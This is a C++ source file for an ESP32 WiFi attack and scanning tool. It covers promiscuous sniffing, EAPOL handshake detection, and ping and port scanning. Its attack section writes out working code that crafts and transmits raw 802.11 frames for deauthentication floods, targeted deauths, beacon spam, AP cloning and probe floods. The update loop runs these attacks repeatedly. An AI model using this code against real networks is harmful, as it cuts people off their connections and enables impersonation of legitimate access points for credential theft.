/*=============================================================
 * WiFiScan.cpp — Core WiFi engine implementation
 *=============================================================*/
#include "WiFiScan.h"
#include <esp_wifi.h>
#include <esp_wifi_types.h>

WiFiScanEngine wifiEngine;
WiFiScanEngine* WiFiScanEngine::_instance = nullptr;

WiFiScanEngine::WiFiScanEngine() {
    _instance = this;
    memset(_aps, 0, sizeof(_aps));
    memset(_stations, 0, sizeof(_stations));
    memset(_channelPkts, 0, sizeof(_channelPkts));
}

void WiFiScanEngine::begin() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(false);
    Serial.println(F("[WIFI] Engine ready"));
}

void WiFiScanEngine::shutdown() {
    stopScan();
    disablePromiscuous();
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
}

// ── Promiscuous Mode ────────────────────────────────────────

void WiFiScanEngine::enablePromiscuous() {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);
}

void WiFiScanEngine::disablePromiscuous() {
    esp_wifi_set_promiscuous(false);
}

void IRAM_ATTR WiFiScanEngine::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_instance) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 28) return;

    _instance->_pktCount++;
    _instance->_totalPkts++;

    uint8_t ch = pkt->rx_ctrl.channel;
    if (ch >= 1 && ch <= 13) _instance->_channelPkts[ch] += 1.0f;

    _instance->parsePacket(pkt->payload, len, pkt->rx_ctrl.rssi, ch);

    // Buffer packet if room
    _instance->packetBuf.push(pkt->payload, min(len, (uint16_t)SNAP_LEN), pkt->rx_ctrl.rssi, ch);
}

// ── Packet Parser ───────────────────────────────────────────

void WiFiScanEngine::parsePacket(const uint8_t* payload, uint16_t len,
                                  int8_t rssi, uint8_t ch) {
    if (len < 24) return;
    uint8_t frameType = payload[0];
    uint8_t subType = (frameType >> 4) & 0x0F;
    uint8_t type = (frameType >> 2) & 0x03;

    // Management frames
    if (type == 0) {
        switch (subType) {
            case 0x08: { // Beacon
                if (_currentMode == WIFI_SCAN_BEACON_SNIFF ||
                    _currentMode == WIFI_SCAN_AP ||
                    _currentMode == WIFI_SCAN_ALL ||
                    _currentMode == WIFI_SCAN_PACKET_MONITOR ||
                    _currentMode == WIFI_SCAN_CHANNEL_ANALYZER ||
                    _currentMode == WIFI_SCAN_RAW) {
                    if (len > 36) {
                        uint8_t ssidLen = payload[37];
                        char ssid[33] = {0};
                        if (ssidLen > 0 && ssidLen <= 32) {
                            memcpy(ssid, &payload[38], ssidLen);
                        }
                        // Extract encryption from capability + tagged params
                        uint8_t enc = 0; // WIFI_AUTH_OPEN
                        uint16_t caps = payload[34] | (payload[35] << 8);
                        bool privacy = (caps & 0x0010) != 0;
                        if (privacy) {
                            enc = 1; // WEP minimum
                            // Walk tagged parameters to find RSN/WPA
                            uint16_t pos = 36;
                            while (pos + 2 < len) {
                                uint8_t tagId = payload[pos];
                                uint8_t tagLen = payload[pos + 1];
                                if (pos + 2 + tagLen > len) break;
                                if (tagId == 48) { enc = 3; break; } // RSN = WPA2
                                if (tagId == 221 && tagLen >= 4) { // Vendor specific
                                    if (payload[pos+2]==0x00 && payload[pos+3]==0x50 &&
                                        payload[pos+4]==0xF2 && payload[pos+5]==0x01) {
                                        enc = 2; // WPA
                                    }
                                }
                                pos += 2 + tagLen;
                            }
                        }
                        addAP(&payload[16], ssid, ch, rssi, enc);
                    }
                }
                break;
            }
            case 0x04: { // Probe Request
                if (_currentMode == WIFI_SCAN_PROBE ||
                    _currentMode == WIFI_SCAN_PINEAPPLE ||
                    _currentMode == WIFI_SCAN_ALL ||
                    _currentMode == WIFI_SCAN_RAW) {
                    // Extract probe SSID
                    if (len > 25 && _currentMode == WIFI_SCAN_PINEAPPLE) {
                        uint8_t ssidLen = payload[25];
                        if (ssidLen > 0 && ssidLen <= 32) {
                            char ssid[33] = {0};
                            memcpy(ssid, &payload[26], ssidLen);
                            Serial.printf("[PROBE] %02X:%02X:%02X looking for '%s'\n",
                                payload[10], payload[11], payload[12], ssid);
                        }
                    }
                    addStation(&payload[10], nullptr, rssi);
                }
                break;
            }
            case 0x05: { // Probe Response
                if (len > 36) {
                    uint8_t ssidLen = payload[37];
                    char ssid[33] = {0};
                    if (ssidLen > 0 && ssidLen <= 32) {
                        memcpy(ssid, &payload[38], ssidLen);
                    }
                    addAP(&payload[16], ssid, ch, rssi, 0);
                }
                break;
            }
            case 0x00: { // Association Request
                if (_currentMode == WIFI_SCAN_STATION || _currentMode == WIFI_SCAN_ALL) {
                    addStation(&payload[10], &payload[4], rssi);
                }
                break;
            }
            case 0x0B: { // Authentication
                if (_currentMode == WIFI_SCAN_ALL || _currentMode == WIFI_SCAN_RAW) {
                    addStation(&payload[10], &payload[4], rssi);
                }
                break;
            }
            case 0x0A: { // Disassociation
                _deauthCount++;
                break;
            }
            case 0x0C: { // Deauth
                _deauthCount++;
                if (_currentMode == WIFI_SCAN_DEAUTH_SNIFF ||
                    _currentMode == WIFI_SCAN_ALL) {
                    Serial.printf("[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X reason=%d\n",
                        payload[10],payload[11],payload[12],payload[13],payload[14],payload[15],
                        payload[4],payload[5],payload[6],payload[7],payload[8],payload[9],
                        payload[24] | (payload[25] << 8));
                }
                break;
            }
        }
    }

    // Data frames
    if (type == 2) {
        // EAPOL detection (LLC/SNAP ethertype 0x888E)
        if (_currentMode == WIFI_SCAN_EAPOL || _currentMode == WIFI_SCAN_ALL) {
            if (len > 34) {
                if (payload[30] == 0x88 && payload[31] == 0x8E) {
                    _eapolCount++;
                    // Check for 4-way handshake message types
                    if (len > 39) {
                        uint8_t keyInfo = payload[37];
                        bool pairwise = (keyInfo & 0x08) != 0;
                        bool ack = (keyInfo & 0x80) != 0;
                        bool mic = (payload[38] & 0x01) != 0;
                        if (pairwise) _handshakes++;
                        Serial.printf("[EAPOL] #%d pairwise=%d ack=%d mic=%d\n",
                            _eapolCount, pairwise, ack, mic);
                    }
                }
            }
        }

        // Station tracking from data frames
        if (_currentMode == WIFI_SCAN_STATION || _currentMode == WIFI_SCAN_ALL ||
            _currentMode == WIFI_SCAN_PACKET_MONITOR) {
            // ToDS: addr1=BSSID, addr2=SRC, addr3=DST
            uint8_t toDS = (payload[1] & 0x01);
            uint8_t fromDS = (payload[1] & 0x02) >> 1;
            if (toDS && !fromDS) {
                addStation(&payload[10], &payload[4], rssi);
            } else if (!toDS && fromDS) {
                addStation(&payload[4], &payload[10], rssi);
            }
        }
    }
}

// ── Scan Control ────────────────────────────────────────────

void WiFiScanEngine::startScan(WiFiScanMode mode) {
    stopScan();
    _currentMode = mode;
    _pktCount = 0;
    _lastPpsCalc = millis();
    enablePromiscuous();
    if (_channelHopping) startChannelHop(_channelHopMs);
    Serial.printf("[WIFI] Scan mode %d started\n", mode);
}

void WiFiScanEngine::stopScan() {
    if (_currentMode == WIFI_SCAN_OFF) return;
    _currentMode = WIFI_SCAN_OFF;
    _attackRunning = false;
    disablePromiscuous();
    Serial.println(F("[WIFI] Scan stopped"));
}

// ── Channel ─────────────────────────────────────────────────

void WiFiScanEngine::setChannel(uint8_t ch) {
    if (ch < 1 || ch > MAX_CHANNELS) return;
    _currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void WiFiScanEngine::startChannelHop(uint16_t intervalMs) {
    _channelHopping = true;
    _channelHopMs = intervalMs;
    _lastChannelHop = millis();
}

void WiFiScanEngine::stopChannelHop() {
    _channelHopping = false;
}

void WiFiScanEngine::hopChannel() {
    _currentChannel++;
    if (_currentChannel > MAX_CHANNELS) _currentChannel = 1;
    esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ── Scan Modes ──────────────────────────────────────────────

void WiFiScanEngine::scanAPs()     { startScan(WIFI_SCAN_AP); startChannelHop(); }
void WiFiScanEngine::scanStations(){ startScan(WIFI_SCAN_STATION); startChannelHop(); }
void WiFiScanEngine::scanAll()     { startScan(WIFI_SCAN_ALL); startChannelHop(); }

void WiFiScanEngine::startProbeSniff()    { startScan(WIFI_SCAN_PROBE); startChannelHop(); }
void WiFiScanEngine::startDeauthSniff()   { startScan(WIFI_SCAN_DEAUTH_SNIFF); startChannelHop(); }
void WiFiScanEngine::startBeaconSniff()   { startScan(WIFI_SCAN_BEACON_SNIFF); startChannelHop(); }
void WiFiScanEngine::startEAPOLSniff()    { _eapolCount=0; _handshakes=0; startScan(WIFI_SCAN_EAPOL); }
void WiFiScanEngine::startPacketMonitor() { startScan(WIFI_SCAN_PACKET_MONITOR); startChannelHop(); }
void WiFiScanEngine::startRawSniff()      { startScan(WIFI_SCAN_RAW); startChannelHop(); }
void WiFiScanEngine::startPineappleSniff(){ startScan(WIFI_SCAN_PINEAPPLE); startChannelHop(); }
void WiFiScanEngine::startMultiSSIDSniff(){ startScan(WIFI_SCAN_MULTI_SSID); startChannelHop(); }
void WiFiScanEngine::startChannelAnalyzer(){
    memset(_channelPkts, 0, sizeof(_channelPkts));
    startScan(WIFI_SCAN_CHANNEL_ANALYZER);
    startChannelHop(200);
}

// ── Network Scanners ────────────────────────────────────────

// Stored targets for network scans
static IPAddress _scanSubnet;
static IPAddress _portScanTarget;
static uint16_t _portScanStart = 0;
static uint16_t _portScanEnd = 0;
static uint16_t _portScanCurrent = 0;
static uint8_t _pingScanCurrent = 1;
static uint32_t _netScanLastStep = 0;

void WiFiScanEngine::startPingScan(IPAddress subnet) {
    stopScan();
    _currentMode = WIFI_SCAN_PING;
    _scanSubnet = subnet;
    _pingScanCurrent = 1;
    _netScanLastStep = 0;
    _attackPktsSent = 0; // reuse as "hosts found" counter
    Serial.printf("[NET] Ping scan %s/24\n", subnet.toString().c_str());
}

void WiFiScanEngine::startARPScan() {
    stopScan();
    _currentMode = WIFI_SCAN_ARP;
    _scanSubnet = WiFi.localIP();
    _scanSubnet[3] = 0;
    _pingScanCurrent = 1;
    _netScanLastStep = 0;
    _attackPktsSent = 0;
    Serial.println(F("[NET] ARP scan started"));
}

void WiFiScanEngine::startPortScan(IPAddress target, uint16_t startPort, uint16_t endPort) {
    stopScan();
    _currentMode = WIFI_SCAN_PORT;
    _portScanTarget = target;
    _portScanStart = startPort;
    _portScanEnd = endPort;
    _portScanCurrent = startPort;
    _netScanLastStep = 0;
    _attackPktsSent = 0;
    Serial.printf("[NET] Port scan %s:%d-%d\n", target.toString().c_str(), startPort, endPort);
}

void WiFiScanEngine::startSSHScan() {
    // Scan common SSH ports on local subnet
    IPAddress gw = WiFi.gatewayIP();
    startPortScan(gw, 22, 22);
}

void WiFiScanEngine::startTelnetScan() {
    IPAddress gw = WiFi.gatewayIP();
    startPortScan(gw, 23, 23);
}

// ── Attacks ─────────────────────────────────────────────────

void WiFiScanEngine::sendDeauth(const uint8_t* bssid, const uint8_t* dst, uint8_t ch) {
    uint8_t deauthPkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dst
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid
        0x00, 0x00,                            // seq
        0x07, 0x00                             // reason: class 3
    };
    memcpy(&deauthPkt[4], dst, 6);
    memcpy(&deauthPkt[10], bssid, 6);
    memcpy(&deauthPkt[16], bssid, 6);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
    _attackPktsSent++;
}

void WiFiScanEngine::sendBeacon(const char* ssid, uint8_t ch, const uint8_t* srcMac) {
    uint8_t pkt[128] = {0};
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    // Frame header
    pkt[0] = 0x80; pkt[1] = 0x00;
    memset(&pkt[4], 0xFF, 6);  // dst broadcast
    memcpy(&pkt[10], srcMac, 6);
    memcpy(&pkt[16], srcMac, 6);

    // Fixed params (timestamp + interval + capabilities)
    pkt[24] = 0x00; // timestamp filled by HW
    pkt[32] = 0x64; pkt[33] = 0x00; // beacon interval 100ms
    pkt[34] = 0x31; pkt[35] = 0x04; // capabilities

    // SSID tag
    pkt[36] = 0x00; pkt[37] = ssidLen;
    memcpy(&pkt[38], ssid, ssidLen);

    uint8_t pos = 38 + ssidLen;
    // Supported rates
    pkt[pos++] = 0x01; pkt[pos++] = 0x08;
    pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8B;
    pkt[pos++] = 0x96; pkt[pos++] = 0x24; pkt[pos++] = 0x30;
    pkt[pos++] = 0x48; pkt[pos++] = 0x6C;
    // DS channel
    pkt[pos++] = 0x03; pkt[pos++] = 0x01; pkt[pos++] = ch;

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, pos, false);
    _attackPktsSent++;
}

void WiFiScanEngine::sendProbeRequest(const char* ssid, uint8_t ch) {
    uint8_t pkt[64] = {0};
    uint8_t mac[6]; generateRandomMAC(mac);
    uint8_t ssidLen = strlen(ssid);

    pkt[0] = 0x40; pkt[1] = 0x00;
    memset(&pkt[4], 0xFF, 6);
    memcpy(&pkt[10], mac, 6);
    memset(&pkt[16], 0xFF, 6);
    pkt[24] = 0x00; pkt[25] = ssidLen;
    memcpy(&pkt[26], ssid, ssidLen);

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, 26 + ssidLen, false);
    _attackPktsSent++;
}

void WiFiScanEngine::startDeauthFlood() {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_DEAUTH_FLOOD;
    enablePromiscuous();
    Serial.println(F("[ATK] Deauth flood started"));
}

// Stored targeted deauth targets
static uint8_t _targetBssid[6];
static uint8_t _targetStation[6];

void WiFiScanEngine::startDeauthTargeted(uint8_t* bssid, uint8_t* staMac) {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_DEAUTH_TARGETED;
    memcpy(_targetBssid, bssid, 6);
    memcpy(_targetStation, staMac, 6);
    enablePromiscuous();
    Serial.printf("[ATK] Targeted deauth: AP=%02X:%02X:%02X STA=%02X:%02X:%02X\n",
        bssid[0],bssid[1],bssid[2], staMac[0],staMac[1],staMac[2]);
}

void WiFiScanEngine::startBeaconSpamList() {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_BEACON_LIST;
    enablePromiscuous();
    Serial.println(F("[ATK] Beacon spam (list) started"));
}

void WiFiScanEngine::startBeaconSpamRandom() {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_BEACON_RANDOM;
    enablePromiscuous();
    if (_ssidCount == 0) generateSSIDs(20);
    Serial.println(F("[ATK] Beacon spam (random) started"));
}

void WiFiScanEngine::startRickRoll() {
    clearSSIDs();
    addSSID("Never Gonna Give You Up");
    addSSID("Never Gonna Let You Down");
    addSSID("Never Gonna Run Around");
    addSSID("And Desert You");
    addSSID("Rick Astley WiFi");
    startBeaconSpamList();
    Serial.println(F("[ATK] Rick Roll started"));
}

void WiFiScanEngine::startProbeFlood() {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_PROBE_FLOOD;
    enablePromiscuous();
}

void WiFiScanEngine::startAPCloneSpam() {
    _attackRunning = true; _attackPktsSent = 0;
    _attackStartTime = millis();
    _currentMode = WIFI_ATTACK_AP_CLONE;
    enablePromiscuous();
}

// ── Data Management ─────────────────────────────────────────

bool WiFiScanEngine::addAP(const uint8_t* bssid, const char* ssid,
                            uint8_t ch, int8_t rssi, uint8_t enc) {
    // Check if already exists
    for (uint16_t i = 0; i < _apCount; i++) {
        if (memcmp(_aps[i].bssid, bssid, 6) == 0) {
            _aps[i].rssi = rssi;
            _aps[i].lastSeen = millis();
            return false;
        }
    }
    if (_apCount >= MAX_APS) return false;

    memcpy(_aps[_apCount].bssid, bssid, 6);
    if (ssid) strncpy(_aps[_apCount].ssid, ssid, 32);
    _aps[_apCount].channel = ch;
    _aps[_apCount].rssi = rssi;
    _aps[_apCount].encType = enc;
    _aps[_apCount].selected = false;
    _aps[_apCount].lastSeen = millis();
    _apCount++;
    return true;
}

bool WiFiScanEngine::addStation(const uint8_t* mac, const uint8_t* apBssid, int8_t rssi) {
    for (uint16_t i = 0; i < _stCount; i++) {
        if (memcmp(_stations[i].mac, mac, 6) == 0) {
            _stations[i].rssi = rssi;
            _stations[i].lastSeen = millis();
            return false;
        }
    }
    if (_stCount >= MAX_STATIONS) return false;

    memcpy(_stations[_stCount].mac, mac, 6);
    if (apBssid) memcpy(_stations[_stCount].apBssid, apBssid, 6);
    _stations[_stCount].rssi = rssi;
    _stations[_stCount].selected = false;
    _stations[_stCount].lastSeen = millis();
    _stCount++;
    return true;
}

void WiFiScanEngine::selectAP(uint8_t idx) {
    if (idx < _apCount) _aps[idx].selected = !_aps[idx].selected;
}

void WiFiScanEngine::selectStation(uint8_t idx) {
    if (idx < _stCount) _stations[idx].selected = !_stations[idx].selected;
}

void WiFiScanEngine::clearAPs()      { _apCount = 0; memset(_aps, 0, sizeof(_aps)); }
void WiFiScanEngine::clearStations() { _stCount = 0; memset(_stations, 0, sizeof(_stations)); }
void WiFiScanEngine::clearSSIDs()    { _ssidCount = 0; for(auto& s : _ssids) s=""; }

void WiFiScanEngine::addSSID(const char* ssid) {
    if (_ssidCount < MAX_SSIDS) _ssids[_ssidCount++] = String(ssid);
}

void WiFiScanEngine::generateSSIDs(uint8_t count) {
    clearSSIDs();
    for (uint8_t i = 0; i < count && i < MAX_SSIDS; i++) {
        char buf[33];
        generateRandomSSID(buf, 16);
        addSSID(buf);
    }
}

bool WiFiScanEngine::setMAC(const uint8_t* mac) {
    return esp_wifi_set_mac(WIFI_IF_STA, mac) == ESP_OK;
}

bool WiFiScanEngine::joinWiFi(const char* ssid, const char* pass) {
    stopScan();
    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, pass);
    int tries = 0;
    while (WiFi.status() != WL_CONNECTED && tries < 40) { delay(500); tries++; }
    return WiFi.status() == WL_CONNECTED;
}

void WiFiScanEngine::disconnectWiFi() { WiFi.disconnect(); }

// ── Helpers ─────────────────────────────────────────────────

String WiFiScanEngine::macToString(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    return String(buf);
}

void WiFiScanEngine::generateRandomMAC(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] &= 0xFE; mac[0] |= 0x02; // locally administered
}

void WiFiScanEngine::generateRandomSSID(char* buf, uint8_t maxLen) {
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    uint8_t len = random(4, maxLen);
    for (uint8_t i = 0; i < len; i++) buf[i] = chars[random(sizeof(chars)-1)];
    buf[len] = '\0';
}

// ── Update (call from loop) ─────────────────────────────────

void WiFiScanEngine::update() {
    if (_currentMode == WIFI_SCAN_OFF) return;
    uint32_t now = millis();

    // PPS calculation
    if (now - _lastPpsCalc >= 1000) {
        _pps = _pktCount - _lastPktSnapshot;
        _lastPktSnapshot = _pktCount;
        _lastPpsCalc = now;
    }

    // Channel hopping
    if (_channelHopping && (now - _lastChannelHop >= _channelHopMs)) {
        hopChannel();
        _lastChannelHop = now;
    }

    // ── Network scanner execution ─────────────────────────────
    if (_currentMode == WIFI_SCAN_PING || _currentMode == WIFI_SCAN_ARP) {
        if (now - _netScanLastStep >= 50 && _pingScanCurrent <= 254) {
            _netScanLastStep = now;
            IPAddress target = _scanSubnet;
            target[3] = _pingScanCurrent;
            WiFiClient client;
            client.setTimeout(100);
            if (client.connect(target, 80) || client.connect(target, 443) ||
                client.connect(target, 22) || client.connect(target, 8080)) {
                _attackPktsSent++; // hosts found
                Serial.printf("[NET] Host alive: %s\n", target.toString().c_str());
                // Add as station for display
                uint8_t fakeMac[6] = {0xAA, 0xBB, target[0], target[1], target[2], target[3]};
                addStation(fakeMac, nullptr, -50);
                client.stop();
            }
            _pingScanCurrent++;
            if (_pingScanCurrent > 254) {
                Serial.printf("[NET] Scan complete. %lu hosts found.\n", _attackPktsSent);
                _currentMode = WIFI_SCAN_OFF;
            }
        }
        return;
    }

    if (_currentMode == WIFI_SCAN_PORT) {
        if (now - _netScanLastStep >= 30 && _portScanCurrent <= _portScanEnd) {
            _netScanLastStep = now;
            WiFiClient client;
            client.setTimeout(200);
            if (client.connect(_portScanTarget, _portScanCurrent)) {
                _attackPktsSent++;
                Serial.printf("[PORT] %s:%d OPEN\n",
                    _portScanTarget.toString().c_str(), _portScanCurrent);
                client.stop();
            }
            _portScanCurrent++;
            if (_portScanCurrent > _portScanEnd) {
                Serial.printf("[PORT] Scan complete. %lu ports open.\n", _attackPktsSent);
                _currentMode = WIFI_SCAN_OFF;
            }
        }
        return;
    }

    // ── Attack execution ──────────────────────────────────────
    if (_attackRunning) {
        switch (_currentMode) {
            case WIFI_ATTACK_DEAUTH_FLOOD: {
                uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
                for (uint16_t i = 0; i < _apCount; i++) {
                    if (_aps[i].selected || _apCount <= 3) {
                        sendDeauth(_aps[i].bssid, broadcast, _aps[i].channel);
                        // Also deauth individual stations
                        for (uint16_t j = 0; j < _stCount; j++) {
                            if (memcmp(_stations[j].apBssid, _aps[i].bssid, 6) == 0) {
                                sendDeauth(_aps[i].bssid, _stations[j].mac, _aps[i].channel);
                            }
                        }
                    }
                }
                break;
            }
            case WIFI_ATTACK_DEAUTH_TARGETED: {
                // Send deauth from AP to station and station to AP
                sendDeauth(_targetBssid, _targetStation, _currentChannel);
                sendDeauth(_targetStation, _targetBssid, _currentChannel);
                // Also broadcast deauth on the AP
                uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
                sendDeauth(_targetBssid, broadcast, _currentChannel);
                break;
            }
            case WIFI_ATTACK_BEACON_LIST:
            case WIFI_ATTACK_BEACON_RANDOM: {
                uint8_t mac[6];
                for (uint8_t i = 0; i < _ssidCount; i++) {
                    generateRandomMAC(mac);
                    uint8_t ch = random(1, 12);
                    sendBeacon(_ssids[i].c_str(), ch, mac);
                }
                break;
            }
            case WIFI_ATTACK_PROBE_FLOOD: {
                for (uint8_t i = 0; i < 10; i++) {
                    char ssid[17]; generateRandomSSID(ssid, 16);
                    sendProbeRequest(ssid, random(1, 14));
                }
                break;
            }
            case WIFI_ATTACK_AP_CLONE: {
                uint8_t mac[6];
                for (uint16_t i = 0; i < _apCount; i++) {
                    if (_aps[i].selected) {
                        generateRandomMAC(mac);
                        sendBeacon(_aps[i].ssid, _aps[i].channel, mac);
                    }
                }
                break;
            }
            default: break;
        }
        delay(1); // yield
    }
}
